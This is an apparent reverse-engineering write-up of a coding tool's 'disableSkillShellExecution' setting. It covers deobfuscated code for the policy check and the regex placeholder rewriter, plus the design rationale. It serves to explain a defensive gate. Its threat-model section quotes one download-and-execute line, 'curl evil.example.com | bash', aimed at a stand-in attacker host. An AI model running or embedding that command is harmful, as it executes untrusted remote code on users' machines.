# `disableSkillShellExecution` Setting (v2.1.91)

## What it does

Slash commands and skills support `!command` and `` ` !`` fences in their markdown body. When a skill is dispatched, the host runs the embedded shell commands and substitutes the output into the prompt before sending it to the model. v2.1.91 added a new setting, `disableSkillShellExecution`, that lets an admin (via managed `policySettings`) or an end-user (via `userSettings`) **disable** that substitution: every fence is rewritten to the literal placeholder `[shell command execution disabled by policy]` and never executed.

This is a security knob - it stops a malicious or accidentally-malicious skill (especially one shipped via a plugin or a project-level `.claude/skills/`) from running arbitrary shell commands at expansion time, no permission prompt required, regardless of the user's permission allowlist.

The setting applies to:

- User skills (`~/.claude/skills/*/SKILL.md`)
- Project skills (`<repo>/.claude/skills/*/SKILL.md`)
- Plugin skills (`<plugin>/skills/*/SKILL.md`)
- Plugin slash commands (`<plugin>/commands/*.md`)
- Custom user/project slash commands (also subject to it)

It does **not** apply to MCP-served skills (those go through the MCP server and don't expand local shell), bundled skills (which compile their commands directly in TypeScript and never use the markdown shell-fence path), or `policySettings`-sourced commands (which are admin-trusted by definition).

---

## How it works

### 1. Schema declaration (chunks.19.mjs:475)

```javascript
// ============================================
// disableSkillShellExecutionSetting - Settings schema entry
// Location: chunks.19.mjs:475
// ============================================

// ORIGINAL (for source lookup):
disableSkillShellExecution: y.boolean().optional().describe("Disable inline shell execution in skills and custom slash commands from user, project, or plugin sources. Commands are replaced with a placeholder instead of being run."),

// READABLE (for understanding):
disableSkillShellExecution: zod.boolean().optional().describe(
  "Disable inline shell execution in skills and custom slash commands " +
  "from user, project, or plugin sources. Commands are replaced with a " +
  "placeholder instead of being run."
),

// Mapping: y -> zod. No symbol rename — same key.
```

The setting is declared in both `userSettingsSchema` and `policySettingsSchema`. When **either** layer sets it to `true`, the gate fires.

### 2. The policy-decision helper (chunks.155.mjs:2839)

```javascript
// ============================================
// isShellExecutionDisabledByPolicy - Returns true when shell exec is gated
// Location: chunks.155.mjs:2839-2842
// ============================================

// ORIGINAL (for source lookup):
function Wc8() {
    if (E1("policySettings")?.disableSkillShellExecution === !0) return !0;
    return y7().disableSkillShellExecution === !0
}

// READABLE (for understanding):
function isShellExecutionDisabledByPolicy() {
  // Managed (admin) layer wins first - if admin set it, ignore user override
  if (getSettingsAt("policySettings")?.disableSkillShellExecution === true) {
    return true;
  }
  // Otherwise honour the user's own setting
  return getUserSettings().disableSkillShellExecution === true;
}

// Mapping: Wc8 -> isShellExecutionDisabledByPolicy, E1 -> getSettingsAt, y7 -> getUserSettings
```

**Key design choice:** the policy layer is checked first. This means a managed policy setting cannot be overridden by a user setting - if your enterprise admin sets `disableSkillShellExecution: true` in `~/.config/claude-code/managed-settings.json`, your own `~/.claude/settings.json` cannot turn it back on. This matches the pattern used by `disableAllHooks`, `allowedMcpServers`, and the other security-relevant settings.

### 3. The placeholder rewriter (chunks.155.mjs:2844)

```javascript
// ============================================
// stripShellExecutionPlaceholders - Rewrites !command and `!command` fences
// Location: chunks.155.mjs:2844-2848
// ============================================

// ORIGINAL (for source lookup):
function Dc8(q) {
    let K = q.replace(KPY, lNK);
    if (K.includes("!`")) K = K.replace(_PY, lNK);
    return K
}
// KPY = /```!\s*\n?[\s\S]*?\n?```/g
// _PY = /(?<=^|\s)!`[^`]+`/gm
// lNK = "[shell command execution disabled by policy]"

// READABLE (for understanding):
const TRIPLE_BACKTICK_BANG_FENCE = /```!\s*\n?[\s\S]*?\n?```/g;
const INLINE_BANG_BACKTICK_FENCE = /(?<=^|\s)!`[^`]+`/gm;
const SHELL_DISABLED_PLACEHOLDER = "[shell command execution disabled by policy]";

function stripShellExecutionPlaceholders(promptBody) {
  // Replace ```! ...``` block fences first
  let result = promptBody.replace(TRIPLE_BACKTICK_BANG_FENCE, SHELL_DISABLED_PLACEHOLDER);
  // Cheap pre-check before the inline regex (avoids walking the body twice when no inline fences exist)
  if (result.includes("!`")) {
    result = result.replace(INLINE_BANG_BACKTICK_FENCE, SHELL_DISABLED_PLACEHOLDER);
  }
  return result;
}

// Mapping: Dc8 -> stripShellExecutionPlaceholders, KPY -> TRIPLE_BACKTICK_BANG_FENCE,
//          _PY -> INLINE_BANG_BACKTICK_FENCE, lNK -> SHELL_DISABLED_PLACEHOLDER
```

**Why two regex passes?** The skill prompt syntax has two distinct shell-fence forms:

- **Block form** (`` ```! `` ... `` ``` ``) - matches multi-line shell scripts. Used by `/security-review` to embed `git diff` output.
- **Inline form** (`` !`command` ``) - matches a single backtick-quoted command in the middle of prose. Used to interpolate a small value (a path, a version) into a sentence.

The `(?<=^|\s)` lookbehind on the inline form prevents matching inside a markdown code span (e.g., `` `then run !`ls`` ``) - the fence must be preceded by either start-of-line or whitespace. The block form has no such restriction because `` ```! `` is unambiguous.

The `result.includes("!`")` cheap check before the second regex is a minor perf optimization: when the body has no inline fences (the common case for procedural skills), the second pass is skipped entirely.

### 4. The source-restriction predicate (chunks.158.mjs:1626)

```javascript
// ============================================
// shouldStripShellInSource - Decides which loadedFrom sources are gated
// Location: chunks.158.mjs:1626-1629
// ============================================

// ORIGINAL (for source lookup):
function s0Y(q, K) {
    if (K === "policySettings") return !1;
    return q === "skills" || q === "commands_DEPRECATED" || q === "plugin"
}

// READABLE (for understanding):
function shouldStripShellInSource(loadedFrom, source) {
  // policySettings-sourced commands are admin-trusted by definition; never strip
  if (source === "policySettings") return false;
  // Strip for the three end-user-modifiable command sources
  return loadedFrom === "skills"
      || loadedFrom === "commands_DEPRECATED"
      || loadedFrom === "plugin";
}

// Mapping: s0Y -> shouldStripShellInSource, q -> loadedFrom, K -> source
```

**Why allow policySettings-sourced commands to keep their shell fences?** Because they were authored by the admin who configured the gate in the first place. The whole point of the policy gate is to protect against untrusted skill authors, and admin-shipped commands are trusted (anyone who can write `policySettings` can already run anything).

**Why three explicit `loadedFrom` strings instead of a denylist?** This is an allowlist - any new `loadedFrom` source added in a future version will default to **not** being gated. That's the safer default for new contexts that haven't been thought through yet. For example, if a future version adds `loadedFrom: "remote-skill"`, the gate won't accidentally neutralize remote-skill shell fences without an explicit code change. It also means MCP skills (`loadedFrom: "mcp"`) are not gated - because their shell-equivalent is the MCP server's RPC, not local `!command` fences.

### 5. The gate-application site (chunks.158.mjs:1773 and chunks.156.mjs:77)

The gate is applied in `getPromptForCommand` immediately after `${CLAUDE_SESSION_ID}` substitution and immediately before `An()` (the normal `!command` expander runs). The branch is mutually exclusive: either the shell fences get stripped to placeholder text **or** the expander runs - never both.

For user/project skills (`loadSkillsDir.ts` equivalent, chunks.158.mjs):

```javascript
// ============================================
// userOrProjectSkillExpansion - Apply gate then either strip or expand
// Location: chunks.158.mjs:1773-1789
// ============================================

// ORIGINAL (for source lookup):
if (h = h.replace(/\$\{CLAUDE_SESSION_ID\}/g, I8()), s0Y(W, M) && Wc8()) h = Dc8(h);
else if (W !== "mcp") h = await An(h, { ... }, `/${q}`, V);

// READABLE (for understanding):
expandedPrompt = expandedPrompt.replace(/\$\{CLAUDE_SESSION_ID\}/g, getSessionId());

if (shouldStripShellInSource(loadedFrom, source) && isShellExecutionDisabledByPolicy()) {
  // Policy gate fires: neutralize all fences
  expandedPrompt = stripShellExecutionPlaceholders(expandedPrompt);
} else if (loadedFrom !== "mcp") {
  // Normal path: actually run the !command fences and substitute output
  expandedPrompt = await runShellExpansionInPrompt(expandedPrompt, {
    ...subToolContext,
    getAppState() {
      // Inject this skill's allowed-tools into the permission context for the
      // duration of the shell expansion
      const baseState = subToolContext.getAppState();
      return {
        ...baseState,
        toolPermissionContext: {
          ...baseState.toolPermissionContext,
          alwaysAllowRules: {
            ...baseState.toolPermissionContext.alwaysAllowRules,
            command: allowedToolsFromFrontmatter,
          },
        },
      };
    },
  }, `/${skillName}`, shellOverride);
}

// Mapping: h -> expandedPrompt, s0Y -> shouldStripShellInSource, Wc8 -> isShellExecutionDisabledByPolicy,
//          Dc8 -> stripShellExecutionPlaceholders, An -> runShellExpansionInPrompt, I8 -> getSessionId,
//          W -> loadedFrom, M -> source
```

For plugin commands (chunks.156.mjs:77), the same branch exists but **without** the `s0Y(loadedFrom, source)` guard - plugin commands are always subject to the gate when `Wc8()` returns true. That matches the schema description in chunks.19.mjs: "skills and custom slash commands from user, project, or **plugin** sources."

---

## Why this approach?

### Alternative 1: per-command permission prompt

Instead of a global on/off gate, the host could route every embedded `!command` through the normal permission system (ask/allow/deny). Why not?

- **Speed** - skill expansion is part of every `/skill` invocation. Stopping to ask the user "may this skill run `git status`?" every time would tank UX.
- **Visibility** - the user doesn't see the skill body before it runs (only the model does). Asking permission on a command the user can't review is fake permission.
- **Scope** - skills routinely contain dozens of fences. Even with grouping, the per-command path is too granular for the threat model (the threat is "skill author maliciously embeds a `curl evil.example.com | bash`", not "skill author wants to run a single bad command").

A global gate solves all three: one decision per session, fast path when allowed, hard-stop when denied.

### Alternative 2: AST-aware partial gate

Strip only the "dangerous" commands (network calls, file deletes) and let safe ones (`echo`, `pwd`) through. Why not?

- **No reliable safe set** - shell is Turing-complete; "safe" depends on cwd, env vars, and what process substitutions resolve to. Trying to maintain a safe-shell-command allowlist is a known losing battle.
- **Maintenance** - the parser would need to keep up with shell quirks across `bash`, `zsh`, and `powershell`. The cost-benefit doesn't pencil out for the threat model.

A binary gate is the right granularity for a security-critical setting.

### Alternative 3: refuse to load the skill entirely

When `disableSkillShellExecution` is on and a skill contains fences, just refuse the skill. Why not?

- **Partial functionality** - many skills have one or two `!` fences for convenience (e.g., `!\`git branch --show-current\``) but their core value is the prose. Refusing the whole skill kills the prose too.
- **Discoverability** - the model sees the skill listing regardless. If the skill is unloadable but visible, the model wastes turns trying to invoke it. The placeholder approach lets the skill still expand into useful prose.

The placeholder ("`[shell command execution disabled by policy]`") is **visible to the model**. When the model reads the expanded prompt, it sees the placeholder text in place of where the shell output would have been. The model can then either (a) note the gate is on and proceed without the data, or (b) decide it can't help and explain why - either is a graceful degradation. The user gets the skill's prose; the policy gate just disables the shell-data-collection part.

---

## Key insight

The gate is **expansion-time**, not invocation-time. It changes what the model sees, not whether the model is allowed to run the skill. That is the right point to gate because:

1. The model never executes shell directly - shell only runs through the BashTool, which goes through the normal permission system. The risk vector is `!command` fences in skill markdown, because those execute **without** going through BashTool's permission check (they're part of prompt-preparation, not tool-use).
2. By rewriting at expansion time, the gate sits in front of the only path that can run shell unprompted. There is no other code path that interprets `!command` fences - so once the rewriter has done its work, the shell text in the prompt is just literal characters that the model reads.

In v2.1.88 there was no equivalent gate - the only protection was the `allowed-tools` frontmatter, which only restricts what the **model** can invoke after expansion. Skill authors could embed any shell command and it would run during expansion regardless of `allowed-tools`. v2.1.91's `disableSkillShellExecution` plugs that hole.
